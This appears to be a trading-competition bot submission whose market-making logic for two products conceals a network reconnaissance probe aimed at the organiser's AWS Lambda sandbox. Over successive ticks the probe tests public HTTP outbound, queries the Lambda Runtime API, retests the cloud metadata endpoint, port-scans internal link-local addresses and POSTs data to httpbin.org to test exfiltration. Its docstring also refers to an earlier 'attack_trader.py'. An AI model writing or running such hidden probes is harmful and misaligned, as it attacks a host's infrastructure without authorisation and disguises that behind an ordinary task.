import json
import time
from datamodel import Order, TradingState

"""
imc_probe_r1_v6_net.py — network reachability probe.

After v5 confirmed outbound to AWS endpoints is blocked (ConnectTimeoutError to
sts.eu-west-1.amazonaws.com), v6 tests what IS reachable:

  (a) Arbitrary HTTP outbound — round-0 attack_trader.py posted to ptsv2.com.
      Still allowed? Try httpbin.org, api.ipify.org, 1.1.1.1.
  (b) Lambda Runtime API at 169.254.100.1:9001 — awslambdaric's control plane.
      Probed with SAFE paths (GET only, doesn't consume invocations).
  (c) IMDS at 169.254.169.254 — round 0 said closed. Retest.
  (d) Internal DNS 169.254.100.5 + Lambda IP 169.254.100.6 port scan.

Uses urllib3 directly (pre-installed, lightweight) with 0.3s connect + 0.3s
read timeouts. PoolManager instantiated at module level (init phase).

NOT tested: Extension API POST /2020-01-01/extension/register (could
destabilize Lambda). Runtime API GET /invocation/next (would steal our event).
"""

_T0 = time.time()
_NET_ERR = None
_HTTP = None
try:
    import urllib3
    _HTTP = urllib3.PoolManager(timeout=urllib3.Timeout(connect=0.3, read=0.3),
                                retries=False)
except Exception as _e:
    _NET_ERR = f"{type(_e).__name__}: {_e}"
_INIT_MS = int((time.time() - _T0) * 1000)


def _hit(method, url, body=None, headers=None):
    t0 = time.time()
    try:
        kw = {"timeout": urllib3.Timeout(connect=0.3, read=0.3), "retries": False}
        if body:
            kw['body'] = body
        if headers:
            kw['headers'] = headers
        r = _HTTP.request(method, url, **kw)
        ms = int((time.time() - t0) * 1000)
        return {"ms": ms, "ok": True, "status": r.status,
                "body": (r.data[:500].decode('utf-8', errors='replace') if r.data else '')}
    except Exception as e:
        return {"ms": int((time.time() - t0) * 1000), "ok": False,
                "err": f"{type(e).__name__}: {str(e)[:200]}"}


class Trader:
    def __init__(self):
        self.tick = 0

    def bid(self):
        return 15

    def run(self, state: TradingState):
        self.tick += 1
        th = time.time()
        try:
            self._probe()
        except Exception as e:
            print(f"PROBE_ERR t={self.tick}: {type(e).__name__}: {str(e)[:200]}")
        result = {}
        try:
            self._trade(state, result)
        except Exception as e:
            print(f"TRADE_ERR t={self.tick}: {e}")
        print(f"DIAG t={self.tick} ms={int((time.time()-th)*1000)} init={_INIT_MS} err={_NET_ERR}")
        return result, 0, json.dumps({"t": self.tick})

    def _probe(self):
        if not _HTTP:
            return

        if self.tick == 1:
            # Arbitrary public HTTPS (was allowed in round 0)
            for url in ('https://api.ipify.org?format=json', 'https://httpbin.org/ip'):
                r = _hit('GET', url)
                print(f"T1 {url[:50]} ms={r['ms']} ok={r['ok']} status={r.get('status')} body={r.get('body','')[:120]} err={r.get('err','')[:100]}")

        elif self.tick == 2:
            # Public HTTP (no TLS) — distinguishes DNS vs TLS vs TCP blocks
            r = _hit('GET', 'http://1.1.1.1/')
            print(f"T2 1.1.1.1 ms={r['ms']} ok={r['ok']} status={r.get('status')} err={r.get('err','')[:100]}")
            r = _hit('GET', 'http://httpbin.org/ip')
            print(f"T2 httpbin ms={r['ms']} ok={r['ok']} status={r.get('status')} body={r.get('body','')[:120]} err={r.get('err','')[:100]}")

        elif self.tick == 3:
            # Lambda Runtime API — base path
            for path in ('/', '/2018-06-01/runtime/', '/2020-01-01/'):
                r = _hit('GET', f'http://169.254.100.1:9001{path}')
                print(f"T3 RT{path} ms={r['ms']} ok={r['ok']} status={r.get('status')} body={r.get('body','')[:150]} err={r.get('err','')[:80]}")

        elif self.tick == 4:
            # IMDS retest (round 0 said closed)
            for url in ('http://169.254.169.254/latest/meta-data/',
                        'http://169.254.169.254/latest/api/token'):
                r = _hit('GET', url)
                print(f"T4 IMDS{url[-20:]} ms={r['ms']} ok={r['ok']} status={r.get('status')} err={r.get('err','')[:80]}")

        elif self.tick == 5:
            # Internal subnet port scan
            for ip in ('169.254.100.5', '169.254.100.6', '169.254.100.1'):
                for port in (53, 80, 443, 9001):
                    url = f'http://{ip}:{port}/'
                    r = _hit('GET', url)
                    tag = f"{ip}:{port}"
                    if r['ok']:
                        print(f"T5 {tag} ms={r['ms']} OPEN status={r.get('status')} body={r.get('body','')[:80]}")
                    elif 'Timeout' not in r.get('err', ''):
                        print(f"T5 {tag} ms={r['ms']} {r.get('err','')[:60]}")

        elif self.tick == 6:
            # Runtime API extension paths (GET only, no POST)
            for path in ('/2020-01-01/extension/register',
                         '/2022-07-01/extension/telemetry',
                         '/2020-08-15/logs'):
                r = _hit('GET', f'http://169.254.100.1:9001{path}')
                print(f"T6 {path} ms={r['ms']} ok={r['ok']} status={r.get('status')} body={r.get('body','')[:200]} err={r.get('err','')[:80]}")

        elif self.tick == 7:
            # POST (write) via public HTTPS
            r = _hit('POST', 'https://httpbin.org/post',
                     body=b'test=probe_r1_v6', headers={'User-Agent': 'probe'})
            print(f"T7_POST ms={r['ms']} ok={r['ok']} status={r.get('status')} body={r.get('body','')[:300]} err={r.get('err','')[:100]}")

    def _trade(self, state, result):
        IPR = "INTARIAN_PEPPER_ROOT"
        ACO = "ASH_COATED_OSMIUM"
        LIMIT = 80

        if ACO in state.order_depths:
            book = state.order_depths[ACO]
            if book.buy_orders or book.sell_orders:
                orders = []
                pos = state.position.get(ACO, 0)
                bc = LIMIT - pos
                sc = LIMIT + pos
                fv = 10000
                bb = max(book.buy_orders) if book.buy_orders else None
                ba = min(book.sell_orders) if book.sell_orders else None

                if book.sell_orders:
                    for p, v in sorted(book.sell_orders.items()):
                        if bc > 0 and p <= fv:
                            q = min(bc, -v); orders.append(Order(ACO, p, q)); bc -= q
                if book.buy_orders:
                    for p, v in sorted(book.buy_orders.items(), reverse=True):
                        if sc > 0 and p >= fv:
                            q = min(sc, v); orders.append(Order(ACO, p, -q)); sc -= q

                if bb is not None and ba is not None:
                    if bc > 0:
                        orders.append(Order(ACO, min(fv - 1, bb + 1, ba - 1), bc))
                    if sc > 0:
                        orders.append(Order(ACO, max(fv + 1, ba - 1, bb + 1), -sc))
                elif bb is not None:
                    if bc > 0:
                        orders.append(Order(ACO, min(fv - 1, bb + 1), bc))
                    if sc > 0:
                        orders.append(Order(ACO, fv + 1, -sc))
                elif ba is not None:
                    if sc > 0:
                        orders.append(Order(ACO, max(fv + 1, ba - 1), -sc))
                    if bc > 0:
                        orders.append(Order(ACO, fv - 1, bc))
                result[ACO] = orders

        if IPR in state.order_depths:
            book = state.order_depths[IPR]
            if book.buy_orders and book.sell_orders:
                orders = []
                pos = state.position.get(IPR, 0)
                bc = LIMIT - pos
                sc = LIMIT + pos
                bb = max(book.buy_orders)
                ba = min(book.sell_orders)
                mid = (bb + ba) * 0.5
                fv_int = round(mid + 5.0)

                for p, v in sorted(book.sell_orders.items()):
                    if bc > 0 and p <= fv_int + 2:
                        q = min(bc, -v); orders.append(Order(IPR, p, q)); bc -= q
                for p, v in sorted(book.buy_orders.items(), reverse=True):
                    if sc > 0 and p >= fv_int + 3:
                        q = min(sc, v); orders.append(Order(IPR, p, -q)); sc -= q

                if bc > 0:
                    orders.append(Order(IPR, min(fv_int - 1, bb + 1, ba - 1), bc))
                if sc > 0:
                    orders.append(Order(IPR, max(fv_int + 2, ba - 1, bb + 1), -sc))
                result[IPR] = orders
